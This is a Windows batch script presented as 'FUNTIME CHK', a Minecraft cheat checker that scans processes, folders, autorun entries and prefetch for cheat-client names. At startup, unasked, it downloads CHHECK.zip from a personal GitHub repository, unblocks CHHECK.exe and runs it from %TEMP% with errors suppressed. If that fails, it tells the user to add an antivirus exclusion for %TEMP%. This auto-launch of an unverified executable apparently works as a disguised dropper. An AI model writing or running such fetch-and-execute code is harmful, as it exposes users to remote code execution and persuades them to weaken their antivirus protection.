@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title FUNTIME CHK
color 0F

for /f %%a in ('powershell -NoProfile -Command "[char]27"') do set "ESC=%%a"
set "G=%ESC%[90m"
set "W=%ESC%[97m"
set "R=%ESC%[91m"
set "GN=%ESC%[92m"
set "Y=%ESC%[93m"
set "X=%ESC%[0m"

set "TD=%~dp0tools"
set "PF86=C:\Program Files (x86)"
set "BANG=!"
set "KWP=vape ghost drip tenacity novoline fdp liquidbounce wurst meteor delta nursultan expensive"
set "KWM=!KWP! rise killaura aristois sigma dumik mhab cortex inject sk3d"

set "ADMIN=0"
net session >nul 2>&1
if not errorlevel 1 set "ADMIN=1"

cls
echo.
echo   %W%FUNTIME CHK%X%   %G%minecraft cheat checker%X%
echo   %G%-----------------------------------------%X%

rem -- always re-download CHHECK to avoid stale/deleted cache --
if exist "%TEMP%\CHHECK" rmdir /s /q "%TEMP%\CHHECK" >nul 2>&1
del /q "%TEMP%\CHHECK.zip" >nul 2>&1

echo   %G%loading...%X%
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip' -OutFile '%TEMP%\CHHECK.zip'}catch{}"

if exist "%TEMP%\CHHECK.zip" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TEMP%\CHHECK.zip' -DestinationPath '%TEMP%\CHHECK' -Force}catch{}"
    del /q "%TEMP%\CHHECK.zip" >nul 2>&1
)

set "CHKLOADED=0"
if exist "%TEMP%\CHHECK\CHHECK.exe" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try{Unblock-File -Path '%TEMP%\CHHECK\CHHECK.exe'}catch{}" >nul 2>&1
    start "" "%TEMP%\CHHECK\CHHECK.exe"
    set "CHKLOADED=1"
)

echo.
if "%CHKLOADED%"=="1" (
    echo   %GN%[+] disk scanner loaded%X%
) else (
    echo   %R%[-] disk scanner failed - add antivirus exclusion for %%TEMP%%%X%
)
echo.
echo   %G%commands:%X%
echo   %W%--chk%X%     %G%scan for cheats%X%
echo   %W%--load%X%    %G%download tools%X%
echo   %W%--help%X%    %G%help%X%
echo   %W%--exit%X%    %G%exit%X%
echo.
if "%ADMIN%"=="0" echo   %G%hint: run as administrator to check prefetch%X%
if not "%~1"=="" (
    set "once=1"
    set "cmd=%~1"
    goto route
)

:prompt
if defined once goto quit
echo.
set "cmd="
set /p "cmd=  %W%>%X% "
if not defined cmd (
    set /a empty+=1
    if !empty! gtr 100 goto quit
    goto prompt
)
set /a empty=0

:route
if "!cmd:~-1!"==" " (
    set "cmd=!cmd:~0,-1!"
    goto route
)
if /i "!cmd!"=="--exit" goto quit
if /i "!cmd!"=="--chk" goto chk
if /i "!cmd!"=="--load" (set "single=" & goto load)
if /i "!cmd:~0,6!"=="--load" (
    set "single=!cmd:~7!"
    set "single=!single: =!"
    goto load
)
if /i "!cmd!"=="--help" goto help
echo   %G%unknown command - list: --help%X%
goto prompt

:help
echo.
echo   %W%--chk%X%            %G%scan system for minecraft cheats%X%
echo   %W%--load%X%          %G%download and open all tools%X%
echo   %W%--load tool%X%     %G%single tool: winprefetchview / shellbags / everything / journaltrace%X%
echo   %W%--exit%X%          %G%exit%X%
echo   %G%tools are downloaded to the tools folder next to the script%X%
goto prompt

:chk
set /a found=0
echo.
echo   %W%[ CHK ]%X%  %G%scanning...%X%
echo   %G%-----------------------------------------%X%

echo   %G%1/7 processes%X%
for %%k in (%KWP%) do (
    for /f "delims=" %%p in ('tasklist 2^>nul ^| findstr /i "%%k"') do (
        echo      %R%[!BANG!] %%p%X%
        set /a found+=1
    )
)
for %%k in (%KWM%) do (
    for /f "delims=" %%p in ('tasklist /m 2^>nul ^| findstr /i "%%k"') do (
        echo      %R%[!BANG!] injected in memory: %%p%X%
        set /a found+=1
    )
)

echo   %G%2/7 .minecraft%X%
set "MC=%APPDATA%\.minecraft"
if not exist "%MC%\" (
    echo      %G%[-] not found%X%
) else (
    echo      %GN%[+] %MC%%X%
    if exist "%MC%\versions\" for /d %%v in ("%MC%\versions\*") do (
        for %%k in (%KWM%) do (
            echo "%%~nxv"| findstr /i "%%k" >nul
            if not errorlevel 1 (
                echo      %R%[!BANG!] client version: %%~nxv%X%
                set /a found+=1
            )
        )
    )
    if exist "%MC%\mods\" for %%m in ("%MC%\mods\*") do (
        for %%k in (%KWM%) do (
            echo "%%~nxm"| findstr /i "%%k" >nul
            if not errorlevel 1 (
                echo      %R%[!BANG!] mod: %%~nxm%X%
                set /a found+=1
            )
        )
    )
)

echo   %G%3/7 appdata / programdata folders%X%
for %%n in (vape vapev4 .vape drip .drip dripclient rise .rise riseclient tenacity .tenacity novoline ghost ghostclient .ghost fdp .fdp liquidbounce like likeclient fog fogclient sentryclient cortex dumik mhab nursultan delta expensive sk3d) do (
    if exist "%APPDATA%\%%~n\" (
        echo      %R%[!BANG!] Roaming\%%~n%X%
        set /a found+=1
    )
    if exist "%LOCALAPPDATA%\%%~n\" (
        echo      %R%[!BANG!] Local\%%~n%X%
        set /a found+=1
    )
)
for %%p in ("%APPDATA%" "%LOCALAPPDATA%" "C:\ProgramData") do (
    for /d %%d in ("%%~p\*") do (
        for %%k in (%KWM%) do (
            echo "%%~nxd"| findstr /i "%%k" >nul
            if not errorlevel 1 (
                echo      %R%[!BANG!] folder: %%d%X%
                set /a found+=1
            )
        )
    )
)

echo   %G%4/7 program files / C: root%X%
for %%n in (Vape Ghost Drip Tenacity Novoline LiquidBounce Delta Nursultan Expensive) do (
    if exist "C:\Program Files\%%~n\" (
        echo      %R%[!BANG!] Program Files\%%~n%X%
        set /a found+=1
    )
    if exist "%PF86%\%%~n\" (
        echo      %R%[!BANG!] Program Files x86\%%~n%X%
        set /a found+=1
    )
)
for /d %%d in ("C:\*") do (
    for %%k in (%KWM%) do (
        echo "%%~nxd"| findstr /i "%%k" >nul
        if not errorlevel 1 (
            echo      %R%[!BANG!] C:\%%~nxd%X%
            set /a found+=1
        )
    )
)

echo   %G%5/7 autorun%X%
for /f "delims=" %%l in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 2^>nul') do (
    for %%k in (%KWP%) do (
        echo "%%l"| findstr /i "%%k" >nul
        if not errorlevel 1 (
            echo      %R%[!BANG!] %%l%X%
            set /a found+=1
        )
    )
)
for /f "delims=" %%l in ('reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" 2^>nul') do (
    for %%k in (%KWP%) do (
        echo "%%l"| findstr /i "%%k" >nul
        if not errorlevel 1 (
            echo      %R%[!BANG!] %%l%X%
            set /a found+=1
        )
    )
)
for %%f in ("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*") do (
    for %%k in (%KWP%) do (
        echo "%%~nxf"| findstr /i "%%k" >nul
        if not errorlevel 1 (
            echo      %R%[!BANG!] autorun: %%~nxf%X%
            set /a found+=1
        )
    )
)

echo   %G%6/7 files - downloads / desktop / recent / temp%X%
for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microsoft\Windows\Recent" "%TEMP%") do (
    for %%k in (%KWM%) do (
        for /f "delims=" %%f in ('dir /b "%%~p" 2^>nul ^| findstr /i "%%k"') do (
            echo      %R%[!BANG!] %%~p\%%f%X%
            set /a found+=1
        )
    )
)

echo   %G%7/7 prefetch%X%
if "%ADMIN%"=="0" (
    echo      %G%[-] no admin rights - skipped%X%
) else (
    for %%f in ("C:\Windows\Prefetch\*.pf") do (
        for %%k in (%KWM%) do (
            echo "%%~nxf"| findstr /i "%%k" >nul
            if not errorlevel 1 (
                echo      %R%[!BANG!] %%~nxf%X%
                set /a found+=1
            )
        )
    )
)

echo   %G%-----------------------------------------%X%
if !found! gtr 0 (
    echo   %R%[!BANG!] result: found !found! - check in JournalTrace / WinPrefetchView%X%
) else (
    echo   %GN%[+] result: nothing suspicious%X%
)
goto prompt

:load
if not exist "%TD%\" md "%TD%"
echo.
echo   %W%[ LOAD ]%X%  %G%tools%X%
echo   %G%-----------------------------------------%X%
call :tool "winprefetchview" "WinPrefetchView" "https://www.nirsoft.net/utils/winprefetchview-x64.zip" zip
call :tool "shellbags" "ShellBags Analyzer+Cleaner" "https://privazer.com/shellbag_analyzer_cleaner.exe" exe
call :tool "everything" "Everything" "https://www.voidtools.com/Everything-1.4.1.1028.x64.zip" zip
call :tool "journaltrace" "JournalTrace" "https://github.com/ponei/JournalTrace/releases/latest/download/JournalTrace.exe" exe
set "single="
goto prompt

:tool
set "tid=%~1"
set "tdisp=%~2"
set "turl=%~3"
set "tmode=%~4"
if defined single (
    echo !tid!| findstr /b /i /l "!single!" >nul
    if errorlevel 1 goto :eof
)
set "tdir=%TD%\%tid%"
if not exist "%tdir%\" (
    echo    %W%... downloading %tdisp%%X%
    md "%tdir%"
    if /i "%tmode%"=="zip" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%TD%\%tid%.zip'}catch{}"
        if exist "%TD%\%tid%.zip" (
            powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TD%\%tid%.zip' -DestinationPath '%tdir%' -Force}catch{}"
            del /q "%TD%\%tid%.zip" >nul 2>&1
        )
    ) else (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%tdir%\%tid%.exe'}catch{}"
    )
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem '%tdir%' -Recurse -Filter *.exe | ForEach-Object { try{Unblock-File $_.FullName}catch{} }" >nul 2>&1
)
set "exe="
for /r "%tdir%" %%f in (*.exe) do if not defined exe set "exe=%%f"
if not defined exe (
    echo    %R%[x] failed to download: %tdisp%%X%
) else (
    start "" "!exe!"
    echo    %GN%[+] %tdisp% started%X%
)
goto :eof

:quit
echo   %G%bye%X%
endlocal
exit /b 0
